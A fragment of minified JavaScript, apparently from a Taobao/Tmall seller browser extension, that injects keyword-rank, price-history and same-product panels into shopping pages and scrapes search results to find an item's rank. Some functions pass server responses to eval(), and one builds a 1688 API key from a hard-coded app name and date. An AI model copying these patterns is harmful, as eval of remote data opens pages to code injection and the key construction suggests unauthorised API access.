        c = "", $(a).find(".dzt-tjb-item:not(:has(.dzt-product-info-bar))").each(function() {
            var d, e, f, a = $(this).find("a").eq(0).attr("data-nid");
            "undefined" == typeof a && (d = /item\.htm\?id=(\d+)/i, $(this).find("a").each(function() {
                var c, b = $(this).attr("href");
                "undefined" == typeof a && d.test(b) && (c = d.exec(b), a = c[1]);
            })), a && b.push(a), e = $(this).find(".shop").find("span:last").html(), f = DAMY.loader.render_search(a, c, e, "tb"), 
            f.find(".kdb-shop").detach(), f.find(".kdb-search").detach(), $(this).append(f);
        }), b.length > 0 && DAMY.loader.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_tjb();
        }, 2e3);
    },
    render_judetail: function() {
        var b, c, a = ".detail-main";
        $(a).length <= 0 || (b = new Array(), c = "", $(".detail-main:not(:has(.dzt-product-info-bar))").each(function() {
            var d, e, a = $("#itemId").val();
            a && b.push(a), d = $(".sellername:eq(0)").text(), e = DAMY.loader.render_search(a, c, d, "tb"), 
            e.find(".kdb-search").detach(), $(this).append(e);
        }), b.length > 0 && DAMY.loader.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_judetail();
        }, 2e3);
    },
    render_jhs: function() {
        var b, c, a = ".ju-itemlist";
        $(a).length <= 0 || (b = new Array(), c = "", $(a).find(".item-small-v3:not(:has(.dzt-product-info-bar)),.item-big-v2:not(:has(.dzt-product-info-bar))").each(function() {
            var d, e, f, a = $(this).find("a").eq(0).attr("data-nid");
            "undefined" == typeof a && (d = /item_id=(\d+)/i, $(this).find("a").each(function() {
                var c, b = $(this).attr("href");
                "undefined" == typeof a && d.test(b) && (c = d.exec(b), a = c[1]);
            })), a && b.push(a), e = $(this).find(".shop").find("span:last").html(), f = DAMY.loader.render_search(a, c, e, "tb"), 
            f.find(".kdb-shop").detach(), f.find(".kdb-search").detach(), $(this).append(f);
        }), b.length > 0 && DAMY.loader.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_jhs();
        }, 2e3);
    },
    render_tqg: function(a) {
        var b, c, d;
        a ? $(".qg-category-list>a.qg-item").removeClass("qg-item").removeClass("qg-ing").wrap('<div class="dzt-tqg-item"></div>') : ("1" != $(".qg-limit-list").attr("load") && $(".qg-limit-list .qg-item").removeClass("qg-item").removeClass("qg-ing").wrap('<div class="dzt-tqg-item"></div>'), 
        $(".qg-limit-list .dzt-tqg-item").length > 0 ? $(".qg-limit-list").attr("load", "1") : $(".qg-limit-list").attr("load", "0"), 
        "1" != $(".qg-last-list").attr("load") && $(".qg-last-list .qg-item").removeClass("qg-item").removeClass("qg-ing").wrap('<div class="dzt-tqg-item"></div>'), 
        $(".qg-last-list .dzt-tqg-item").length > 0 ? $(".qg-last-list").attr("load", "1") : $(".qg-last-list").attr("load", "0"), 
        "1" != $(".qg-brand-list").attr("load") && $(".qg-brand-list .qg-item").removeClass("qg-item").removeClass("qg-ing").wrap('<div class="dzt-tqg-item"></div>'), 
        $(".qg-brand-list .dzt-tqg-item").length > 0 ? $(".qg-brand-list").attr("load", "1") : $(".qg-brand-list").attr("load", "0")), 
        $(".dzt-tqg-item").addClass("qg-item qg-ing"), b = ".qg-category-list,.qg-limit-list,.qg-last-list,.qg-brand-list", 
        $(b).length <= 0 || (c = new Array(), d = "", $("#q").length && (d = $("#q").val()), 
        $(b).find(".dzt-tqg-item:not(:has(.dzt-product-info-bar))").each(function() {
            var a, b, e, f;
            $(this).find(".qg-done").length > 0 ? (a = "", $(this).append(a)) : (b = $(this).find("a").eq(0).attr("data-nid"), 
            "undefined" == typeof b && (e = /item\.htm\?id=(\d+)&/i, $(this).find("a").each(function() {
                var c, a = $(this).attr("href");
                "undefined" == typeof b && e.test(a) && (c = e.exec(a), b = c[1]);
            })), b && c.push(b), f = $(this).find(".shop").find("span:last").html(), a = DAMY.loader.render_search(b, d, f, "tb"), 
            a.find(".kdb-shop").detach(), a.find(".kdb-search").detach(), $(this).append(a));
        }), c.length > 0 && DAMY.loader.search_kws(c, "tb")), setTimeout(function() {
            DAMY.loader.render_tqg(a);
        }, 2e3);
    },
    render_tmallstore: function() {
        var b, c, d, a = ".J_TItems,.shop-list";
        $(a).length <= 0 || (b = new Array(), c = "", d = $(".slogo-shopname").text(), $(a).find(".item:not(:has(.dzt-product-info-bar))").each(function() {
            var e, a = DAMY.loader.seach_item_id(this);
            a && (b.push(a), e = DAMY.loader.render_search(a, c, d, "tmall"), $(this).append(e));
        }), this.search_kws(b, "tmall")), setTimeout(function() {
            DAMY.loader.render_tmallstore();
        }, 1e3);
    },
    render_store: function() {
        var b, c, d, a = ".shop-hesper-bd";
        $(a).length <= 0 || $(a).attr("dzt-load") || (b = new Array(), c = "", d = $(".shop-name>a").text().replace("进入店铺", ""), 
        $(a).attr("dzt-load", "dzt"), $(a).find(".item").each(function() {
            var e, a = DAMY.loader.seach_item_id(this);
            a && (b.push(a), e = DAMY.loader.render_search(a, c, d, "tb"), $(this).append(e));
        }), this.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_store();
        }, 1e3);
    },
    render_tmallgj: function() {
        var b, c, a = "#J_ItemList";
        $(a).length <= 0 || $(a).attr("dzt-load") || (b = new Array(), c = $("#q").val(), 
        $(a).attr("dzt-load", "dzt"), $(a).find(".product").each(function() {
            var d, e, a = $(this).attr("data-id");
            a && (b.push(a), d = $(this).find(".productShop-name").text(), e = DAMY.loader.render_search(a, c, d, "tmall"), 
            $(this).find(".product-iWrap").append(e));
        }), this.search_kws(b, "tmall")), setTimeout(function() {
            DAMY.loader.render_tmallgj();
        }, 1e3);
    },
    render_mysearch: function() {
        var b, c, a = "#mysearch-grid";
        $(a).length <= 0 || (b = new Array(), c = $("#q").val(), $(a).find(".grid-cell:not(:has(.dzt-product-info-bar))").each(function() {
            var d, e, a = DAMY.loader.seach_item_id(this);
            a && (b.push(a), d = $(this).find(".shop-name").text(), e = DAMY.loader.render_search(a, c, d, "tb"), 
            e.insertAfter($(this).find(".goods")));
        }), b.length && this.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_mysearch();
        }, 1e3);
    },
    render_global: function() {
        var b, a = ".m-itemlist";
        $(a).length <= 0 || (b = new Array(), $(a).find(".item:not(:has(.dzt-product-info-bar))").each(function() {
            var c, d, a = DAMY.loader.seach_item_id(this);
            a && (b.push(a), c = $(this).find(".shop").find("span:last").html(), d = DAMY.loader.render_search(a, "", c, "tb"), 
            d.insertAfter($(this).children("div:last")));
        }), b.length && DAMY.loader.search_kws(b, "tb")), setTimeout(DAMY.loader.render_global, 2e3);
    },
    render_tttj: function() {
        var b, c, a = "#J_TJ_Items,.J_Top4,.tj_items";
        $(a).length <= 0 || (b = new Array(), c = "", $(a).find(".J_TJ_Item:not(:has(.dzt-product-info-bar)),.top4_item:not(:has(.dzt-product-info-bar)),.J_Item:not(:has(.dzt-product-info-bar))").each(function() {
            var a, d, e;
            a = $(this).find(".tj_item_link[data-id]").length > 0 ? $(this).find(".tj_item_link").attr("data-id") : $(this).find(".top4_item_link[data-id]").length > 0 ? $(this).find(".top4_item_link").attr("data-id") : DAMY.loader.seach_item_id(this), 
            a && (b.push(a), d = "", e = DAMY.loader.render_search(a, c, d, "tb"), e.find(".kdb-shop").detach(), 
            e.find(".kdb-search").detach(), $(this).append(e));
        }), this.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_tttj();
        }, 1e3);
    },
    render_view: function(a, b) {
        var c = http + "://lu.taobao.com/api/item?type=view_count&id=" + a + "&_ksTS=1412581003175_109&callback=1&p=u&from=mypath&f=jp&jsonpCallback=jsonp";
        $.ajax({
            dataType: "text",
            url: c,
            success: function(c) {
                c = JSON.parse(c.slice(2, -1)), c.listDesc && c.listDesc.view_count ? $("#view_count_" + a).html(c.listDesc.view_count) : (b || (b = 0), 
                $("#view_count_" + a).html(b)), $("#dzt_time_" + a).show();
            }
        });
    },
    render_list: function() {
        var b, a = ".m-itemlist,.m-items";
        $(a).length <= 0 || (b = new Array(), $(a).find(".item:not(:has(.dzt-product-info-bar))").each(function() {
            var c, d, a = $(this).find("a").eq(0).attr("data-nid");
            "undefined" == typeof a && (a = DAMY.loader.seach_item_id(this)), a && (b.push(a), 
            c = $(this).find(".shop").find("span:last").html(), d = DAMY.loader.render_search(a, "", c, "tb"), 
            d.insertAfter($(this).children("div:last")));
        }), b.length && DAMY.loader.search_kws(b, "tb")), setTimeout(DAMY.loader.render_list, 2e3);
    },
    render_tmall: function() {
        var a, b;
        $("#J_ItemList").length <= 0 || $("#J_ItemList").attr("dzt-load") || (a = new Array(), 
        b = $("#mq").val(), $("#J_ItemList").attr("dzt-load", "dzt"), $("#J_ItemList>div").each(function() {
            var d, e, c = $(this).attr("data-id");
            c && (a.push(c), d = $(this).find(".ww-small").attr("data-nick"), e = DAMY.loader.render_search(c, b, d, "tmall"), 
            e.insertAfter($(this).find(".productStatus")));
        }), this.search_kws(a, "tmall")), setTimeout(function() {
            DAMY.loader.render_tmall();
        }, 1e3);
    },
    render_hc: function() {
        if ($("#list-itemList").length <= 0) ; else {
            var a = new Array();
            $("#list-itemList").find(".item:not(:has(.dzt-product-info-bar))").each(function() {
                var c, d, b = $(this).attr("data-itemid");
                b || (b = DAMY.loader.seach_item_id(this)), b && (a.push(b), c = $(this).find(".shopname").text(), 
                d = DAMY.loader.render_search(b, "", c, "tb"), d.insertAfter($(this).children("div:last")));
            }), a.length && DAMY.loader.search_kws(a, "tb");
        }
        setTimeout(function() {
            DAMY.loader.render_hc();
        }, 1e3);
    },
    render_tb: function() {
        var b, c, a = ".m-itemlist,.m-items,.m-recitem";
        $(a).length <= 0 || (b = new Array(), c = "", $("#q").length && (c = $("#q").val()), 
        $(a).find(".item:not(:has(.dzt-product-info-bar)),.recitem:not(:has(.dzt-product-info-bar))").each(function() {
            var d, e, f, a = $(this).find("a").eq(0).attr("data-nid");
            "undefined" == typeof a && (d = /item\.htm\?id=(\d+)&/i, $(this).find("a").each(function() {
                var c, b = $(this).attr("href");
                "undefined" == typeof a && d.test(b) && (c = d.exec(b), a = c[1]);
            })), a && b.push(a), e = $(this).find(".shop").find("span:last").html(), f = DAMY.loader.render_search(a, c, e, "tb"), 
            f.insertAfter($(this).children("div:last"));
        }), b.length > 0 && DAMY.loader.search_kws(b, "tb"), $(a).find(".item .ironman-item-info").length > 0 && $(a).find(".item:not(.item-p4p)").attr("style", "height:560px!important;")), 
        setTimeout(function() {
            DAMY.loader.render_tb();
        }, 2e3);
    },
    render_same: function() {
        var b, c, a = ".m-recitem,.container";
        $(a).length <= 0 || $(a).attr("dzt-load") || (b = new Array(), c = "", $(a).attr("dzt-load", "dzt"), 
        $(a).find(".recitem,.item").each(function() {
            var d, e, f, a = $(this).find("a").eq(0).attr("data-nid");
            "undefined" == typeof a && (d = /item\.htm\?id=(\d+)&/i, $(this).find("a").each(function() {
                var c, b = $(this).attr("href");
                "undefined" == typeof a && d.test(b) && (c = d.exec(b), a = c[1]);
            })), b.push(a), e = $(this).find(".info1__shop,.info__shop").find("span:first").attr("data-nick"), 
            f = DAMY.loader.render_search(a, c, e, "tb"), f.insertAfter($(this).children("div:last"));
        }), this.search_kws(b, "tb")), setTimeout(function() {
            DAMY.loader.render_same();
        }, 1e3);
    },
    seach_item_id: function(a) {
        var b = "", c = /item\.htm\?.*id=(\d+)/i;
        return $(a).find("a").each(function() {
            var d, a = $(this).attr("href");
            return c.test(a) ? (d = c.exec(a), b = d[1], !1) : void 0;
        }), b;
    },
    delayload_time: function(a) {
        $.get(dzt_url + "/api/times/" + a, function(a) {
            var b, c, d;
            if (a) for (b in a) "r" != b && (c = $("#dzt_time_" + b).find("b").eq(0), d = DAMY.loader.handle_time(a[b].t), 
            c.attr("title", d["title"]), c.html(d["html"]), $("#dzt_time_" + b).show());
        });
    },
    handle_time: function(a) {
        var c, b = {
            title: "暂时无法获取,刷新重试,或者打开详情页看看.",
            html: "-"
        };
        return a > 604800 && (c = 1e3 * a, c < window.curr_date && (c += 6048e5), b["title"] = DAMY.loader.getDate(c).format("yyyy-MM-dd EEE HH:mm:ss"), 
        b["html"] = DAMY.loader.remainTime(window.curr_date, c)), b;
    },
    search_kws: function(a, b) {
        var c, d;
        if (a.length) if (c = !1, $.get(dzt_url + "/api/kws", {
            ids: a.join(","),
            f: b,
            v: "OmVr6IoEWP"
        }, function(a) {
            var b, d, e;
            for (b in a) "tid" == b && (c = !0, setTimeout(DAMY.loader.delayload_time(a[b]), 1500)), 
            $(".dzt-list-tb-" + b).html(a[b].tb), $(".dzt-list-ztc-" + b).html(a[b].z), $(".dzt-list-mobile-" + b).html(a[b].m), 
            $(".dzt-list-ztc-mobile-" + b).html(a[b].zm), a[b].t && (d = $("#dzt_time_" + b).find("b").eq(0), 
            e = DAMY.loader.handle_time(a[b].t.dt), d.attr("title", e["title"]), d.html(e["html"]), 
            $("#dzt_time_" + b).show());
        }), "http" == http) for (d in a) DAMY.loader.render_view(a[d]); else if ("undefined" != typeof bg) for (d in a) DAMY.loader.render_view(a[d]); else console.log("error!");
    },
    remainTime: function(a, b) {
        var c, d, e, f;
        return a > b && (b += 6048e5), c = b / 1e3 - a / 1e3, d = parseInt(c / 86400), e = parseInt(c / 3600), 
        f = parseInt(c / 60), d + "天" + (e - 24 * d) + "时" + (f - 60 * e) + "分";
    },
    init_cat: function(a, b) {
        $("#dzt_cat_" + a).show(), $("#dzt_cat_" + a).mouseover(function() {
            if (!$(this).attr("dzt-load")) if ($("#dzt_cat_" + a).attr("dzt-load", "1"), cache_cats.hasOwnProperty(b) && cache_cats[b]) DAMY.loader.render_cat(a, cache_cats[b]); else {
                var c = window.location.href;
                0 == c.indexOf("https") && (http = "https", dzt_url = "https://ssl.dianzhentan.com"), 
                $.get(dzt_url + "/api/cat", {
                    cid: b
                }, function(c) {
                    c && c.cat && (cache_cats[b] = c, DAMY.loader.render_cat(a, c));
                });
            }
        });
    },
    render_cat: function(a, b) {
        var c = $("#dzt_cat_" + a).find("div").eq(0);
        c.attr("title", b.fcat), c.html(b.fcat);
    },
    render_search: function(a, b, c, d, e) {
        var f;
        return f = "undefined" == typeof e ? search_html : e, f = f.replace("<!--ztc_search_html-->", ztc_search_html), 
        f = f.replace("<!--mobile_html-->", mobile_kw_html), f = "tmall" == d ? f.replace(/<!--search-type-->/g, "天猫") : f.replace(/<!--search-type-->/g, "淘宝"), 
        f = f.replace(/-pid-/g, a), f = f.replace(/-dzt-t-/g, d), f = $(f), f.attr("id", "dzt-product-info-bar-" + a), 
        f.find(".dzt-list-tb-val").attr("id", "dzt-list-tb-" + a).addClass("dzt-list-tb-" + a).attr("href", "http://ci.dianzhentan.com/item/" + a + "/?z=sug&f=" + d), 
        f.find(".dzt-list-ztc-val").attr("id", "dzt-list-ztc-" + a).addClass("dzt-list-ztc-" + a).attr("href", "http://ci.dianzhentan.com/item/" + a + "/?z=sug&f=ztc_" + d), 
        f.find(".dzt-list-mobile-val").attr("id", "dzt-list-mobile-" + a).addClass("dzt-list-mobile-" + a).attr("href", "http://ci.dianzhentan.com/item/" + a + "/?z=sug&f=mobile"), 
        f.find(".dzt-list-ztc-mobile-val").attr("id", "dzt-list-ztc-mobile-" + a).addClass("dzt-list-ztc-mobile-" + a).attr("href", "http://ci.dianzhentan.com/item/" + a + "/?z=sug&f=ztc_mobile"), 
        b ? f.find(".kdb-search").attr("href", "http://so.kandianbao.com/" + b + "/?z=sug") : f.find(".kdb-search").attr("href", "http://www.kandianbao.com/?z=sug"), 
        c ? f.find(".kdb-shop").attr("href", "http://dian.kandianbao.com/" + c + "/?z=sug") : f.find(".kdb-shop").attr("href", "http://www.kandianbao.com/?z=sug"), 
        f.find(".kdb-item").attr("href", "http://item.kandianbao.com/" + a + "/?z=sug"), 
        f.find(".price_link").hover(function() {
            DAMY.loader.price_on(this);
        }, function() {
            DAMY.loader.price_out(this);
        }), f.find(".dzt-ci-hover").mouseover(function() {
            DAMY.loader.load_kwlist(this, a);
        }), f;
    },
    load_kwlist: function(obj, id) {
        var kw_type, type_des;
        $(obj).attr("load") || (obj = $(obj), kw_type = obj.attr("data-t"), type_des = "", 
        $.get(dzt_url + "/api/kw", {
            id: id,
            f: kw_type,
            m: "t"
        }, function(data) {
            var html, imgURL, tmphtml;
            switch (kw_type) {
              case "tb":
                type_des = "淘宝";
                break;

              case "ztc_tb":
                type_des = "淘宝直通车";
                break;

              case "mobile":
                type_des = "无线淘宝搜索";
                break;

              case "ztc_mobile":
                type_des = "无线淘宝直通车";
                break;

              case "tmall":
                type_des = "天猫搜索";
                break;

              case "ztc_tmall":
                type_des = "天猫直通车";
            }
            obj.attr("load", "1"), html = "", data = eval(data), data.length ? ($.each(data, function() {
                html += "<tr><td>" + this.kw + "</td><td>" + this.rank + "</td></tr>";
            }), imgURL = "http://www.dianzhentan.com/static/images/arrow_r.gif", "https" == http && (imgURL = "https://ssl.tqdn.cn/static/images/arrow_r.gif?d=20150815"), 
            tmphtml = '<tr class="last_tr"><td><span style="color:#ccc;"><span style="color:#f35a4a;">' + new Date(window.curr_date - 864e5).format("yyyy-MM-dd") + " " + type_des + "</span>前5页数据</span></td>" + "</tr><tr></tr><tr></tr>", 
            html += tmphtml) : html += '<tr class="last_tr"><td colspan="2" style="text-align:center;"><a href="http://www.yiquntui.com/" target="_blank">暂无关键词</a></td></tr>', 
            obj.find("tbody").html(html);
        }));
    },
    check_tbcc: function() {
        if ($("tbcc").length) {
            var a = new Array();
            $("tbcc").find("ul>li").each(function() {
                var c, b = $(this).find("a").eq(0).attr("atpanel");
                b = b.split(",")[1], a.push(b), c = $(ztc_html), c.find(".dzt-tmall-val").attr("id", "dzt-tmall-" + b), 
                c.find(".dzt-mobile-val").attr("id", "dzt-mobile-" + b), c.insertBefore($(this).children("div:last"));
            }), $.get(dzt_url + "/api/ztc", {
                ids: a.join(",")
            }, function(a) {
                for (var b in a) $("#dzt-tmall-" + b).html(a[b].tmall), $("#dzt-mobile-" + b).html(a[b].mobile);
            });
        } else setTimeout(this.check_tbcc, 1e3);
    },
    trim_all: function(a) {
        return a.replace(/[\n\s*\r]*/g, "");
    },
    getDate: function(a) {
        return new Date(parseInt(a));
    },
    price_on: function(a) {
        var c, d, b = $(a).find(".chart");
        $(a).find(".chart_container").show(), "false" == b.attr("loaded") && ("https" != http ? (c = echarts.init(b.get(0)), 
        c.showLoading(loading_opt), d = b.attr("pid"), $.get("http://ok.etao.com/api/price_history.do?nid=" + d, function(a) {
            a = JSON.parse(a), a && a.result && a.result.length > 0 ? DAMY.loader.price_build(a.result[0].data, a.meta ? a.meta.lowest : null, c, b) : c.showLoading(nodata_loading_opt);
        }, "text")) : "undefined" != typeof bg ? bg.postMessage({
            act: "getPrice",
            pid: b.attr("pid"),
            cb: "DAMY.loader.bg_price_callback"
        }) : console.log("error!"));
    },
    bg_price_callback: function(a, b) {
        var d, c = $("#dzt-product-info-bar-" + b + " .chart");
        c.length <= 0 && (c = $(".dztbar-detail .chart")), d = echarts.init(c.get(0)), d.showLoading(loading_opt), 
        a = JSON.parse(a), a && a.result && a.result.length > 0 ? DAMY.loader.price_build(a.result[0].data, a.meta ? a.meta.lowest : null, d, c) : d.showLoading(nodata_loading_opt);
    },
    price_build: function(a, b, c, d) {
        var j, k, l, m, n, e = a[0][0], f = a[a.length - 1][0], g = DAMY.loader.getFullDate(e, f, a), h = new Array(), i = new Array();
        if ($.each(g, function(a, b) {
            h.push(b[0]), i.push(b[1]);
        }), a.length >= 1 && (j = a[0], k = a[0]), a.length > 1) for (l = 1; l < a.length; l++) j = j[1] - a[l][1] > 0 ? j : a[l], 
        k = k[1] - a[l][1] > 0 ? a[l] : k;
        m = [ k[1], j[1] ], n = [ k[0], j[0] ], chart_opt.series[0].itemStyle.normal.label.formatter = function(a, b, c) {
            return $.inArray(c, m) >= 0 && $.inArray(b, n) >= 0 ? "￥ " + c : "￥" + c;
        }, chart_opt.xAxis[0].data = h, chart_opt.series[0].data = i, c.hideLoading(), c.setOption(chart_opt), 
        d.attr("loaded", "true"), b && d.before('<div class="price-box">历史最低：<span class="red">￥' + b + '</span> | 收录时间：<span class="red">' + e + "</span></div>");
    },
    price_out: function(a) {
        var b = $(a).find(".chart_container");
        b.hide();
    },
    getFullDate: function(a, b, c) {
        var j, k, l, m, n, o, p, d = [], e = a.split("-"), f = b.split("-"), g = new Date(parseInt(e[0]), parseInt(e[1]) - 1, parseInt(e[2])), h = new Date(parseInt(f[0]), parseInt(f[1]) - 1, parseInt(f[2])), i = (h.getTime() - g.getTime()) / 864e5 + 1;
        for (j = 0; i > j; j++) {
            if (k = new Date(g.getFullYear(), g.getMonth(), g.getDate() + j), l = k.getDate() >= 10 ? k.getDate() : "0" + k.getDate(), 
            m = [ k.getFullYear() + "-" + (k.getMonth() + 1) + "-" + l ], j > 0) {
                for (n = 0; n < c.length; n++) if (o = c[n][0].split("-"), p = new Date(parseInt(o[0]), parseInt(o[1]) - 1, parseInt(o[2])), 
                k.getTime() <= p.getTime() && k.getTime() === p.getTime()) {
                    m[1] = c[n][1];
                    break;
                }
                1 == m.length && (m[1] = d[d.length - 1][1]);
            } else m[1] = c[0][1];
            d.push(m);
        }
        return d;
    },
    aliEncode: function(a) {
        for (var f, g, h, b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", e = a.length, d = 0, c = ""; e > d; ) {
            if (f = 255 & a.charCodeAt(d++), d == e) {
                c += b.charAt(f >> 2), c += b.charAt((3 & f) << 4), c += "==";
                break;
            }
            if (g = a.charCodeAt(d++), d == e) {
                c += b.charAt(f >> 2), c += b.charAt((3 & f) << 4 | (240 & g) >> 4), c += b.charAt((15 & g) << 2), 
                c += "=";
                break;
            }
            h = a.charCodeAt(d++), c += b.charAt(f >> 2), c += b.charAt((3 & f) << 4 | (240 & g) >> 4), 
            c += b.charAt((15 & g) << 2 | (192 & h) >> 6), c += b.charAt(63 & h);
        }
        return c;
    },
    load_same_item: function() {
        var b, c, a = $("#dzt_tool_same_item_lst").attr("loaded");
        "true" != a && "loading" != a && ($("#dzt_tool_same_item_lst").attr("loaded", "loading"), 
        $("#dzt_tool_same_item_lst").html('<span class="one-line-txt">加载中，请稍后...</span>'), 
        b = $(".dztbar-detail").attr("pid"), c = DAMY.loader.aliEncode("taosellerran;" + window.curr_date), 
        $.get("https://open-s.1688.com/openservice/taoOfferSameSimilarBusinessService?appName=taosellerran&appKey=" + c + "&fromOfferId=" + b, function(a) {
            var e, f, g, h, c = "", d = -1;
            if (a && a.data.offerList && a.data.totalCount > 0) {
                for (c += "<ul>", offerList = a.data.offerList, d = offerList.length > 5 ? 5 : offerList.length, 
                e = 0; d > e; e++) c += '<li><a class="dzt_same_item" href="' + offerList[e].detailUrl + '" target="_blank"><img src="' + offerList[e].imageUrl.replace("summ", "120x120xz") + '"/></a><div class="dzt_same_item_p">￥' + offerList[e].price + "</div></li>";
                c += "</ul>", d > 5 && (f = /key=[0-9a-f]+/gi, g = f.exec(offerList[0].detailUrl), 
                g && (h = "https://s.1688.com/youyuan/collaboration_search.htm?tab=similarDesign&showStyle=shopwindow&fromOfferId=" + b + "&" + g[0], 
                c += '<div class="dzt_more_same_item">共' + a.data.totalCount + '件 <a class="hover-link" href="' + h + '" target="_blank">查看更多货源</a></div>'));
            } else c += '<span class="one-line-txt">暂无数据</span>';
            d > 0 && 5 >= d && $("#dzt_tool_same_item_lst").css("width", 136 * d + "px").css("margin-left", "-" + 68 * d + "px"), 
            $("#dzt_tool_same_item_lst").html(c), $("#dzt_tool_same_item_lst").attr("loaded", "true");
        }));
    },
    same_item_on: function() {
        DAMY.loader.load_same_item(), $("#dzt_tool_same_item_lst").show();
    },
    same_item_out: function() {
        $("#dzt_tool_same_item_lst").hide();
    },
    ck_rank_on: function() {
        $("#dzt_tool_ck_rank_detail").show();
    },
    ck_rank_out: function() {
        $("#dzt_tool_ck_rank_detail").hide();
    },
    ck_rank: function(l_kw, l_type, pid, page, s_url) {
        page++, $("#dzt_ck_rank_ret").html("正在搜索：第 <b>" + page + "</b> 页");
        var s;
        1 == page ? (ret_t_set = new Set(), s = 48, $(".dzt_tool_ck_rank>a").addClass("d_warning"), 
        rank_array = new Array()) : s = 44 * (page - 1) + 48, s_url || (s_url = "https://s.taobao.com/search?q=" + encodeURIComponent(l_kw) + "&ie=utf8"), 
        $.ajax({
            dataType: "text",
            url: s_url,
            success: function(data, ts, xhr) {
                var search_ret, content_reg, ret, auctions, i, rk, rank_item, line, po, p4pdata, p4p_right, p4p_bottom, next_url, ret_str;
                if (200 == xhr.status) {
                    if (1 == page ? (content_reg = /g_page_config = \{.*\};/g, ret = content_reg.exec(data), 
                    ret && ret.length > 0 && eval(ret[0].replace("g_page_config = ", "search_ret = "))) : (eval(data), 
                    search_ret = g_search_ret), search_ret.url && search_ret.url.indexOf("https://sec.taobao.com/query.htm?action=QueryAction") >= 0) return $("#dzt_ck_rank_ret").html("访问频繁，请歇一歇或登录后再试"), 
                    $("#dzt_tool_start_ck_rank").addClass("dzt_btn_danger").removeAttr("disabled").text("开始查询"), 
                    $(".dzt_tool_ck_rank>a").removeClass("d_warning"), void 0;
                    if (search_ret.mods.itemlist.data && search_ret.mods.itemlist.data.auctions) {
                        if (auctions = search_ret.mods.itemlist.data.auctions, "org" == l_type || "both" == l_type) for (i = 0; i < auctions.length; i++) if (auctions[i].nid == pid) {
                            rk = i + 1, rank_item = new Object(), rank_item["t"] = "tb", rank_item["page"] = page, 
                            rank_item["rank"] = rk, rank_item["item"] = auctions[i], line = parseInt(rk / 4) + 1, 
                            po = 0 == rk % 4 ? 4 : rk % 4, rank_item["txt"] = "淘宝搜索（第" + page + "页" + line + "排" + po + "位）", 
                            rank_array.push(rank_item);
                            break;
                        }
                        if ("simba" == l_type || "both" == l_type) {
                            for (i = 0; i < auctions.length; i++) if (auctions[i].nid == pid && 1 == auctions[i].p4p) {
                                rk = i + 1, rank_item = new Object(), rank_item["t"] = "simba", rank_item["page"] = page, 
                                rank_item["rank"] = rk, rank_item["item"] = auctions[i], rank_item["txt"] = "淘宝搜索直通车（左" + rk + "位）", 
                                rank_array.push(rank_item);
                                break;
                            }
                            for (p4pdata = JSON.parse(search_ret.mods.p4p.data.p4pdata), p4p_right = p4pdata.right.data.ds1, 
                            i = 0; i < p4p_right.length; i++) if (rk = i + 1, p4p_right[i].RESOURCEID == pid) {
                                rank_item = new Object(), rank_item["t"] = "simba", rank_item["page"] = page, rank_item["rank"] = rk, 
                                rank_item["item"] = p4p_right[i], rank_item["txt"] = "直通车（右" + rk + "位）", rank_array.push(rank_item);
                                break;
                            }
                            for (p4p_bottom = p4pdata.bottom.data.ds1, i = 0; i < p4p_bottom.length; i++) if (p4p_bottom[i].RESOURCEID == pid) {
                                rk = i + 1, rank_item = new Object(), rank_item["t"] = "simba", rank_item["page"] = page, 
                                rank_item["rank"] = rk, rank_item["item"] = p4p_bottom[i], rank_item["txt"] = "直通车（下" + rk + "位）", 
                                rank_array.push(rank_item);
                                break;
                            }
                        }
                        if (next_url = search_ret.mainInfo.modLinks.pager + "&data-key=s&data-value=" + s + "&ajax=true&callback=search_ret_fun", 
                        "both" == l_type) for (i = 0; i < rank_array.length; i++) ret_t_set.add(rank_array[i].t);
                    }
                    if (0 == rank_array.length && 10 > page && auctions || "both" == l_type && ret_t_set.size < 2 && 10 > page && auctions) setTimeout(function() {
                        DAMY.loader.ck_rank(l_kw, l_type, pid, page, next_url);
                    }, 300); else if (0 == rank_array.length && page >= 10 || 0 == rank_array.length && !auctions) $("#dzt_tool_start_ck_rank").addClass("dzt_btn_danger").removeAttr("disabled").text("开始查询"), 
                    $(".dzt_tool_ck_rank>a").removeClass("d_warning"), $("#dzt_ck_rank_ret").html("查询结果：<b>" + l_kw + "</b> 关键词 未发现此宝贝。"); else if (rank_array.length > 0 && "both" != l_type || rank_array.length >= 1 && "both" == l_type || rank_array.length > 0 && !auctions) {
                        for (ret_str = "查询结果：", i = 0; i < rank_array.length; i++) ret_str += rank_array[i].txt + " ";
                        $("#dzt_ck_rank_ret").html(ret_str), $("#dzt_tool_start_ck_rank").addClass("dzt_btn_danger").removeAttr("disabled").text("开始查询"), 
                        $(".dzt_tool_ck_rank>a").removeClass("d_warning");
                    }
                } else $("#dzt_ck_rank_ret").html("访问频繁，请歇一歇或登录后再试"), $("#dzt_tool_start_ck_rank").addClass("dzt_btn_danger").removeAttr("disabled").text("开始查询"), 
                $(".dzt_tool_ck_rank>a").removeClass("d_warning");
            }
        });
    }
};





var frameHtml = '<div id="Layer1"><div id="win_top"><span onmouseover="this.style.cursor=\'pointer\'" onclick="window.open(\' http://www.yiquntui.com\')">易群推助手 ——</span><i onmouseover="this.style.cursor=\'pointer\'" onclick="window.open(\' http://www.shihuizhu.com\')"> 热推产品</i> （插件用户QQ群：<l style="color:#f35a4a;" onmouseover="this.style.cursor=\'pointer\'" onclick="window.open(\' http://jq.qq.com/?_wv=1027&k=2DRx29M\')">56779026</l>）<span id="text4"onClick="Layer1.style.display=\'none\'">关闭</span></div><div id = "div1"><div id="id1"></div><div id="id2"></div><br/><div id="id3"></div><div id="id4"></div></div></div>';

var nologinHtml = '<div ><span>你还没有登陆阿里妈妈，无法查询佣金计划等。</span></div><div><a id = "text5" href ="http://pub.alimama.com/" target= "_blank">点击转入阿里妈妈登陆页</a></div>';

var nocapaction = '<div style="color:#F00">此商品没有参与淘宝推广，没有对应的佣金。</div><br/>';

